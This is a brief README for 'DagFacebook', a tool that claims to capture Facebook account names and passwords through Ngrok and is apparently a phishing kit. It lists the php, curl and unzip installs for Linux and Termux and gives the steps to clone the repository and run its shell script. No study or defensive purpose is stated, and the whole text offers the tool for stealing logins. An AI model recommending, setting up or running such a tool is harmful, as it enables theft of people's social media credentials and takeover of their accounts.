# DagFacebook
Sniff Account and Password facebook with Ngrok

# Linux Install
apt-get install php
apt-get install curl
apt-get install unzip
# Termux Install
pkg install php
pkg install curl
pkg install unzip

# Usage
1. git clone https://github.com/foolsteams/DagFacebook
2. cd DagFacebook
3. bash dagfacebook.sh
